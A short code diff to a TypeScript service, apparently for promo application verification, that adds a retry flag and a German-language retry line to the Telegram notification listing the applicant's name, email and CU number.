@@ -32,6 +32,7 @@ export async function checkAndProcessVerifications(): Promise<number> {
           email: app.email,
           cuNumber: app.cuNumber,
           emailSent,
+          isRetry: app.status === "retry",
         });
         sendTelegramNotification(tgMessage).catch((err) =>
           console.error("TG verification notify error:", err)
@@ -91,10 +92,16 @@ function formatVerificationMessage(app: {
   email: string;
   cuNumber: string;
   emailSent: boolean;
+  isRetry?: boolean;
 }): string {
   const lines = [
-    `✅ <b>Promo Application Verified!</b>`,
+    `✅ <b>Promo Application Verified!</b>${app.isRetry ? ` ↩️` : ``}`,
     ``,
+  ];
+  if (app.isRetry) {
+    lines.push(`🔄 <i>Retry nach Aufladung — Antrag wurde nach No-Money-Schritt bestätigt.</i>`, ``);
+  }
+  lines.push(
     `👤 <b>Name:</b> ${app.name}`,
     `📧 <b>E-Mail:</b> ${app.email}`,
     `🔢 <b>CU-Nummer:</b> ${app.cuNumber}`,
@@ -104,7 +111,7 @@ function formatVerificationMessage(app: {
       : `⚠️ Failed to send confirmation email`,
     ``,
     `⏰ ${new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}`,
-  ];
+  );
   return lines.join("\n");
 }
 
